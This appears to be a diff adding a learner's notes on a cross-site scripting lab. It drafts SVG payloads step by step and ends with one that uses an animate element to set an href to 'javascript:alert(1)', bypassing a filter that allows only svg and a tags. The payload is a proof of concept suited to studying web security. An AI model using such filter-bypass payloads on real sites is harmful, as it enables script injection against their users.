@@ -1,0 +1,20 @@
+/*
+intruder says svg and a tags are allowed
+we need to put the text click me in 
+*/
+
+//payload draft1
+<svg><text x="20" y="35">Click me</text></svg>
+
+
+//payload draft2 to make it clickable
+<svg><a><text x="20" y="35">Click me</text><a></svg>
+
+/the ps cheat sheet has an animate tag/
+/*The SVG animate element provides a way to control 
+an attribute of an element over time.
+
+
+*/
+
+<svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text><a></svg>
